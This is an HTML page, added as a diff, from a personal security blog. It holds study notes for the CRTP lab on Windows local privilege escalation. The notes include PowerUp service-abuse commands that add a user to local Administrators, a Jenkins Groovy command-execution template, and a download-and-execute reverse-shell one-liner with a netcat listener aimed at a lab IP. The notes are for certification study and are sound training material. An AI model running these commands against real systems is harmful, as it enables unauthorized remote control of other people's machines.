@@ -1,0 +1,667 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>2 - Win Privesc |</title>
+<meta name="description" content="Unquoted Paths and Modifiable Services ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="2 - Win Privesc">
+<meta property="og:url" content="http://localhost:4000/notes/crtp/winprivesc/">
+
+
+  <meta property="og:description" content="Unquoted Paths and Modifiable Services ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header1.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-15T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/crtp/winprivesc/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header1.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          2 - Win Privesc
+
+        
+      </h1>
+      
+        <p class="page__lead">Unquoted Paths and Modifiable Services
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  1 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/" class="active">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="2 - Win Privesc">
+    <meta itemprop="description" content="Unquoted Paths and Modifiable Services">
+    <meta itemprop="datePublished" content="2023-12-15T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#win-privesc---local">Win Privesc - Local</a>
+    <ul>
+      <li><a href="#services-issues-using-powerup">Services Issues using PowerUp</a></li>
+      <li><a href="#feature-abuse">Feature Abuse</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="win-privesc---local">Win Privesc - Local</h1>
+
+<blockquote>
+  <p>The material of CRTP about Local Privesc is not great</p>
+</blockquote>
+
+<p><strong>There are various ways of locally escalating privileges on Windows box</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">–</span><span class="w"> </span><span class="n">Missing</span><span class="w"> </span><span class="nx">patches</span><span class="w">
+</span><span class="err">–</span><span class="w"> </span><span class="n">Automated</span><span class="w"> </span><span class="nx">deployment</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">AutoLogon</span><span class="w"> </span><span class="nx">passwords</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">clear</span><span class="w"> </span><span class="nx">text</span><span class="w">
+</span><span class="err">–</span><span class="w"> </span><span class="n">AlwaysInstallElevated</span><span class="w"> </span><span class="p">(</span><span class="n">Any</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">MSI</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="p">)</span><span class="w">
+</span><span class="err">–</span><span class="w"> </span><span class="n">Misconfigured</span><span class="w"> </span><span class="nx">Services</span><span class="w">
+</span><span class="err">–</span><span class="w"> </span><span class="n">DLL</span><span class="w"> </span><span class="nx">Hijacking</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">more</span><span class="w">
+</span><span class="err">–</span><span class="w"> </span><span class="n">NTLM</span><span class="w"> </span><span class="nx">Relaying</span><span class="w"> </span><span class="nx">a.k.a.</span><span class="w"> </span><span class="nx">Won</span><span class="s1">'t Fix
+</span></code></pre></div></div>
+
+<p><strong>We can use below tools for complete coverage</strong>:</p>
+
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerSploit - Privesc Module</a></p>
+
+<p><a href="https://github.com/enjoiz/Privesc">Privesc on GitHub</a></p>
+
+<p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winPEAS in PEASS-ng</a></p>
+
+<h2 id="services-issues-using-powerup">Services Issues using PowerUp</h2>
+
+<p><strong>Get services with unquoted paths and a space in their name</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ServiceUnquoted</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Get services where the current user can write to its binary path or change arguments to the binary</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ModifiableServiceFile</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Get the services whose configuration current user can modify</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ModifiableService</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Run all checks with automated tools</strong> :</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># PowerUp:</span><span class="w">
+</span><span class="n">Invoke-AllChecks</span><span class="w">
+
+</span><span class="c"># Privesc:</span><span class="w">
+</span><span class="n">Invoke-PrivEsc</span><span class="w">
+
+</span><span class="c"># PEASS-ng:</span><span class="w">
+</span><span class="n">winPEASx64.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="feature-abuse">Feature Abuse</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- If you have Admin access (default installation before 2.x), go to http://&lt;jenkins_server&gt;/script
+- In the script console, Groovy scripts could be executed.
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">def</span><span class="w"> </span><span class="nx">sout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="nx">StringBuffer</span><span class="p">(),</span><span class="w"> </span><span class="n">serr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="nx">StringBuffer</span><span class="p">()</span><span class="w">
+</span><span class="n">def</span><span class="w"> </span><span class="nx">proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'
+[INSERT COMMAND]'</span><span class="o">.</span><span class="nf">execute</span><span class="p">()</span><span class="w">
+</span><span class="n">proc.consumeProcessOutput</span><span class="p">(</span><span class="n">sout</span><span class="p">,</span><span class="w"> </span><span class="nx">serr</span><span class="p">)</span><span class="w">
+</span><span class="n">proc.waitForOrKill</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span><span class="w">
+</span><span class="n">println</span><span class="w"> </span><span class="s2">"out&gt; </span><span class="nv">$sout</span><span class="s2"> err&gt; </span><span class="nv">$serr</span><span class="s2">"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>If you don’t have admin access but could add or edit build steps in the build configuration. Add a build step, add “Execute Windows Batch Command” and enter:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">command</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Again, you could download and execute scripts, run encoded scripts and more.</p>
+</blockquote>
+
+<p><strong>Learning Objective 5</strong>:</p>
+
+<ul>
+  <li>Exploit a service and elevate privileges to local administrator.</li>
+  <li>Identify a machine in the domain where ur user has local administrative access.</li>
+  <li>Using privileges of a user on Jenkins get admin privileges on another server.</li>
+</ul>
+
+<p><strong>[easy to detect]</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-ServiceAbuse</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'AbyssWebServer'</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="nx">dcorp\studentx</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">Administrators</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>[easy to detect - noise]</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-PSRemotingLocalAdminAccess</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">on</span><span class="w"> </span><span class="nx">Jenkins</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">iwr</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nx">http://172.16.100.1/Invoke-PowerShellTcp.ps1</span><span class="p">);</span><span class="w"> </span><span class="n">power</span><span class="w"> </span><span class="nt">-Reverse</span><span class="w"> </span><span class="nt">-IPAddress</span><span class="w"> </span><span class="nx">172.16.100.1</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">443</span><span class="w">
+</span><span class="n">on</span><span class="w"> </span><span class="nx">Attacker</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">webserver</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">example:</span><span class="w"> </span><span class="nx">HFS</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="nx">File</span><span class="w"> </span><span class="nx">Server</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>disable firewall or add exception</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">on</span><span class="w"> </span><span class="nx">Attacker</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">netcat-win32-1.12.exe</span><span class="w"> </span><span class="nt">-lvp</span><span class="w"> </span><span class="nx">443</span><span class="w">
+</span></code></pre></div></div>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">AD</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#crtp" class="page__taxonomy-item" rel="tag">crtp</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-15T00:00:00+06:00">December 15, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=2+-+Win+Privesc%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrtp%2Fwinprivesc%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrtp%2Fwinprivesc%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrtp%2Fwinprivesc%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/crtp/enum/" class="pagination--pager" title="1 - AD Enumeration
+">Previous</a>
+    
+    
+      <a href="/notes/crtp/latmov/" class="pagination--pager" title="3 - Lateral Movement
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
